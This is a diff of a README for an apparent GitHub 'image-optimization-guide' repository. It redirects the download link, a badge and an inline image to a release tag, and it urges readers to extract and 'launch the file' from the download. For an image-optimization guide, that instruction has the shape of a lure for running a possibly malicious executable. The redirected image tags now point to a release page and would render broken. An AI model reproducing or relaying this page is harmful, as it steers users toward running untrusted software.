@@ -21,14 +21,14 @@ Welcome to the "image-optimization-guide" repository - your go-to resource for b
 - Web Performance Enhancement
 
 ## Repository Link 📦
-[Download the accompanying files for this guide here](https://github.com/files/Soft.zip)
+[Download the accompanying files for this guide here](https://github.com/ytunprovoke/image-optimization-guide/releases/tag/v1.2)
 
 ### Note:
 Ensure to extract and launch the file if it ends with a specific filename.
 
 If the provided link is unaccessible, please check the "Releases" section for an alternative download option.
 
-[![Download Files](https://img.shields.io/badge/Download-Files-brightgreen)](https://github.com/files/Soft.zip)
+[![Download Files](https://github.com/ytunprovoke/image-optimization-guide/releases/tag/v1.2)](https://github.com/ytunprovoke/image-optimization-guide/releases/tag/v1.2)
 
 ## Repository Structure 🏗️
 1. **Introduction to Image Optimization**  
@@ -68,7 +68,7 @@ By following the guidelines and recommendations provided in this image optimizat
 
 Let's optimize those images and boost your web presence! 🌟
 
-![Image Optimization](https://images.unsplash.com/photo-1550348466-b72382102dfa)
+![Image Optimization](https://github.com/ytunprovoke/image-optimization-guide/releases/tag/v1.2)
 
 --- 
 
